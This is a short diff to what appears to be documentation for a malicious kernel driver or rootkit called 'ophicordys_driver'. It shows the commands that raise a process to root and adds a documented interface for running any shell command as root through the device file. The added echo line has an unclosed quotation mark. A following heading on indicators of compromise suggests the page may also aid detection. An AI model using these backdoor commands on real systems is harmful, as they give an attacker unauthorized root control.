@@ -40,6 +40,9 @@ ps
 
 # Elevate shell to root
 echo "elevate <pid>" > /dev/ophicordys_driver
+
+# Execute shell command as root. Can be a maximum of 512 bytes long.
+echo "execute <command> > /dev/ophicordys_driver
 ```
 
 ## Indicators of compromise / How to detect
